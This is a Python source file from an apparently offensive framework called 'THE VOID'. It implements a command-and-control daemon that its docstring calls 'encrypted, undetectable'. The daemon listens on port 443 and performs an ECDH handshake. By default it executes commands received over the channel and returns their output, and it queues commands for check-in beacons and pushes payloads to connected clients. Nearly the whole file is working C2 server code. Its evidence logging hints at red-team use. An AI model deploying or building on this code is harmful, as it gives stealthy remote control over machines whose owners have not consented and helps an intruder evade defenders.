"""THE VOID — C2Daemon: The core C2 daemon.

The C2 daemon is a custom Command and Control framework that provides
encrypted, undetectable communication channels with target machines.
It uses beacons, encrypted channels, and stealth protocols.
"""

import json
import logging
import os
import random
import socket
import ssl
import threading
import time
from typing import Any, Callable, Dict, List, Optional

from c2.handshake import HandshakeError, HandshakeServer, Session
from core.crypto import Crypto
from core.executor import Executor
from core.warlog import LogLevel, WarLog

logger = logging.getLogger("void.c2.daemon")


class C2Daemon:
    """Custom C2 daemon — encrypted, undetectable command and control."""

    def __init__(self, host: str = "0.0.0.0", port: int = 443,
                 crypto: Optional[Crypto] = None, executor: Optional[Executor] = None,
                 warlog: Optional[WarLog] = None, require_handshake: bool = True):
        self.host = host
        self.port = port
        self.crypto = crypto or Crypto()
        self.executor = executor or Executor()
        self.warlog = warlog if warlog is not None else WarLog()
        # Fail closed: clients must complete the ECDH handshake before any
        # command traffic is accepted. Operators may disable explicitly.
        self.require_handshake = require_handshake
        self.handshake = HandshakeServer(crypto=self.crypto)
        self.clients: Dict[str, Dict[str, Any]] = {}
        self.beacons: Dict[str, Dict[str, Any]] = {}
        self.command_queue: List[Dict[str, Any]] = []
        self.results: Dict[str, List[Dict[str, Any]]] = {}
        self.running = False
        self.server_socket: Optional[socket.socket] = None
        self.thread: Optional[threading.Thread] = None
        self.handler: Optional[Callable] = None
        logger.info(f"C2Daemon initialized on {host}:{port}")

    def set_handler(self, handler: Callable) -> None:
        """Set the command handler function.

        Args:
            handler: Function to handle commands
        """
        self.handler = handler

    def start(self) -> None:
        """Start the C2 daemon."""
        if self.running:
            logger.warning("C2 daemon is already running")
            return

        self.running = True
        self.thread = threading.Thread(target=self._run, daemon=True)
        self.thread.start()
        logger.info("C2 daemon started")

    def stop(self) -> None:
        """Stop the C2 daemon."""
        self.running = False
        if self.server_socket:
            self.server_socket.close()
        logger.info("C2 daemon stopped")

    def _run(self) -> None:
        """Run the C2 daemon server."""
        try:
            self.server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            self.server_socket.bind((self.host, self.port))
            self.server_socket.listen(10)
            self.server_socket.settimeout(1.0)

            logger.info(f"C2 daemon listening on {self.host}:{self.port}")

            while self.running:
                try:
                    client_socket, addr = self.server_socket.accept()
                    self._handle_client(client_socket, addr)
                except socket.timeout:
                    continue
                except Exception as e:
                    logger.error(f"Error accepting connection: {e}")
        except Exception as e:
            logger.error(f"C2 daemon error: {e}")
        finally:
            if self.server_socket:
                self.server_socket.close()

    def _handle_client(self, client_socket: socket.socket, addr: tuple) -> None:
        """Handle a client connection.

        Args:
            client_socket: Client socket
            addr: Client address
        """
        logger.info(f"New connection from {addr}")
        client_id = f"{addr[0]}:{addr[1]}"
        try:
            data = client_socket.recv(65536)
            if not data:
                client_socket.close()
                return
            payload = json.loads(self.crypto.decrypt(data.decode()))

            # Encrypted channel: handshake first (fail closed), then commands.
            if payload.get("type") == "handshake_hello":
                self._do_handshake(client_socket, addr, payload)
                return

            session = self._resolve_session(payload)
            if self.require_handshake and session is None:
                logger.warning(
                    "Unauthenticated command from %s refused (handshake required)",
                    client_id,
                )
                self._evidence(
                    "c2.handshake_required", LogLevel.C2,
                    target=client_id,
                    data={"reason": "command before handshake"},
                )
                client_socket.close()
                return

            if session is not None:
                # Session traffic is sealed under the per-session key.
                inner = session.open_json(payload["sealed"])
                response = self._process_command(inner)
                out = session.seal_json(response)
            else:
                # Legacy plaintext-command path (require_handshake disabled).
                response = self._process_command(payload)
                out = self.crypto.encrypt(json.dumps(response))
            client_socket.send(out.encode())
        except Exception as e:
            logger.error(f"Error handling client {client_id}: {e}")
        finally:
            client_socket.close()

    def _do_handshake(self, client_socket: socket.socket, addr: tuple,
                      hello: Dict[str, Any]) -> None:
        """Run the ECDH handshake and register the resulting session."""
        client_id = f"{addr[0]}:{addr[1]}"
        try:
            reply, state = self.handshake.process_hello(hello)
        except HandshakeError as e:
            logger.warning(f"Handshake rejected from {client_id}: {e}")
            self._evidence(
                "c2.handshake_rejected", LogLevel.C2,
                target=client_id,
                data={"client_id": str(hello.get("client_id", "")), "reason": str(e)},
            )
            client_socket.close()
            return

        client_socket.send(self.crypto.encrypt(json.dumps(reply)).encode())
        data2 = client_socket.recv(65536)
        confirm_payload = json.loads(self.crypto.decrypt(data2.decode()))
        try:
            session = self.handshake.confirm(state, confirm_payload)
        except HandshakeError as e:
            logger.warning(f"Handshake confirm rejected from {client_id}: {e}")
            self._evidence(
                "c2.handshake_rejected", LogLevel.C2,
                target=client_id,
                data={"client_id": str(state.get("client_id", "")), "reason": str(e)},
            )
            client_socket.close()
            return

        self.clients[client_id] = {
            "socket": client_socket,
            "address": addr,
            "connected_at": time.time(),
            "last_checkin": time.time(),
            "session": session,
        }
        self._evidence(
            "c2.handshake_ok", LogLevel.C2,
            target=client_id,
            data=session.evidence(),
        )
        ack = session.seal_json({"type": "handshake_ok", "session": session.evidence()})
        client_socket.send(ack.encode())

    def _resolve_session(self, payload: Dict[str, Any]) -> Optional[Session]:
        """Return the Session for a sealed session payload, else None."""
        session_id = payload.get("session", "")
        if not session_id or "sealed" not in payload:
            return None
        for client in self.clients.values():
            session = client.get("session")
            if session is not None and session.client_id == session_id:
                return session
        return None

    def _evidence(self, message: str, level: LogLevel, target: str,
                  data: Optional[Dict[str, Any]] = None) -> None:
        """Write WarLog evidence for a C2 event (never key material)."""
        try:
            self.warlog.log(message, level=level, module="c2.daemon",
                            target=target, data=data)
        except Exception:
            logger.exception("WarLog write failed for C2 event %s", message)

    def _process_command(self, payload: Dict[str, Any]) -> Dict[str, Any]:
        """Process a command from a client.

        Args:
            payload: Command payload

        Returns:
            Dict with command response
        """
        command = payload.get("command", "")
        logger.info(f"Processing command: {command[:100]}")

        if self.handler:
            try:
                result = self.handler(command)
                return {"success": True, "result": result, "timestamp": time.time()}
            except Exception as e:
                return {"success": False, "error": str(e), "timestamp": time.time()}

        # Default handler: execute the command (argv-first; Executor.run_command
        # is a safe alias of Executor.run — no shell interpolation of input).
        result = self.executor.run_command(command, timeout=payload.get("timeout", 30))
        return {
            "success": result.success,
            "stdout": result.stdout[:5000] if result.stdout else "",
            "stderr": result.stderr[:500] if result.stderr else "",
            "exit_code": result.exit_code,
            "timestamp": time.time(),
        }

    def add_command(self, command: str, client_id: str = "", priority: int = 0) -> str:
        """Add a command to the queue.

        Args:
            command: The command to execute
            client_id: Target client ID
            priority: Command priority (higher = more urgent)

        Returns:
            Command ID
        """
        cmd_id = f"cmd_{int(time.time())}_{random.randint(1000, 9999)}"
        self.command_queue.append({
            "id": cmd_id,
            "command": command,
            "client_id": client_id,
            "priority": priority,
            "timestamp": time.time(),
            "status": "pending",
        })
        logger.info(f"Command {cmd_id} added to queue")
        return cmd_id

    def get_commands(self, client_id: str = "") -> List[Dict[str, Any]]:
        """Get pending commands for a client.

        Args:
            client_id: Client ID to get commands for

        Returns:
            List of pending commands
        """
        return [
            cmd for cmd in self.command_queue
            if cmd.get("client_id") == client_id and cmd.get("status") == "pending"
        ]

    def get_result(self, cmd_id: str) -> Optional[Dict[str, Any]]:
        """Get the result of a command.

        Args:
            cmd_id: Command ID

        Returns:
            Dict with command result or None
        """
        return self.results.get(cmd_id)

    def get_status(self) -> Dict[str, Any]:
        """Get the C2 daemon status."""
        return {
            "running": self.running,
            "host": self.host,
            "port": self.port,
            "clients": len(self.clients),
            "beacons": len(self.beacons),
            "pending_commands": len([c for c in self.command_queue if c.get("status") == "pending"]),
            "completed_commands": len([c for c in self.command_queue if c.get("status") == "completed"]),
        }

    def send_to_client(self, client_id: str, payload: Dict[str, Any]) -> bool:
        """Send data to a specific client.

        Args:
            client_id: Client ID
            payload: Data to send

        Returns:
            True if sent successfully
        """
        if client_id not in self.clients:
            logger.warning(f"Client {client_id} not found")
            return False

        try:
            client = self.clients[client_id]
            session = client.get("session")
            if session is not None:
                encrypted = session.seal_json(payload)
            else:
                encrypted = self.crypto.encrypt(json.dumps(payload))
            client["socket"].send(encrypted.encode())
            return True
        except Exception as e:
            logger.error(f"Error sending to {client_id}: {e}")
            return False

    def register_beacon(self, beacon_id: str, interval: float = 30.0) -> None:
        """Register a beacon.

        Args:
            beacon_id: Beacon ID
            interval: Beacon interval in seconds
        """
        self.beacons[beacon_id] = {
            "id": beacon_id,
            "interval": interval,
            "last_checkin": time.time(),
            "active": True,
        }
        logger.info(f"Beacon {beacon_id} registered")

    def beacon_checkin(self, beacon_id: str) -> Dict[str, Any]:
        """Handle a beacon checkin.

        Args:
            beacon_id: Beacon ID

        Returns:
            Dict with checkin result
        """
        if beacon_id not in self.beacons:
            return {"error": f"Beacon {beacon_id} not found", "success": False}

        beacon = self.beacons[beacon_id]
        beacon["last_checkin"] = time.time()

        # Get any pending commands for this beacon
        pending = self.get_commands(beacon_id)
        if pending:
            return {
                "success": True,
                "commands": pending,
                "timestamp": time.time(),
            }

        return {"success": True, "commands": [], "timestamp": time.time()}

    def get_all_beacons(self) -> Dict[str, Dict[str, Any]]:
        """Get all registered beacons."""
        return self.beacons

    def get_active_clients(self) -> List[Dict[str, Any]]:
        """Get active clients."""
        return [
            {
                "id": cid,
                "address": client["address"],
                "connected_at": client["connected_at"],
                "last_checkin": client["last_checkin"],
            }
            for cid, client in self.clients.items()
        ]
